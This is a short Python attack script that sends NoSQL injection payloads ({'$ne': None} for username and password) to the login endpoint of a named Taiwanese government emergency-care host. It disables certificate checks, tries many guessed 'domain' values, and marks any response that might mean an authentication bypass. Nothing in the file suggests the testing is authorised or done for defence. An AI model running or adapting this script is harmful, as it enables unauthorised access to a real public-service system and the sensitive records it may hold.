import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(body_dict):
    body=json.dumps(body_dict).encode()
    req=urllib.request.Request(BASE+"/login",data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 匹配所有用户($ne) + 变化 domain
print("=== $ne + 不同 domain 值 ===")
domains=["AUTH_SERVER","PORTAL","WEB","API","APP","EMERGENCY","TPF","PORT","DISPATCH","CONSOLE","ADMIN","MOBILE","PORTAL_TW","tpf.gov.tw","http://epcr.tpf.gov.tw:4004","AUTH","PORTAL_AUTH","EMCR"]
for d in domains:
    code,b=post_login({"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":d})
    mark=" ***" if code not in (403,500) else ""
    print(f"  domain=[{d:30s}] -> {code} | {b[:70]}{mark}")
    time.sleep(0.08)
print("DONE")
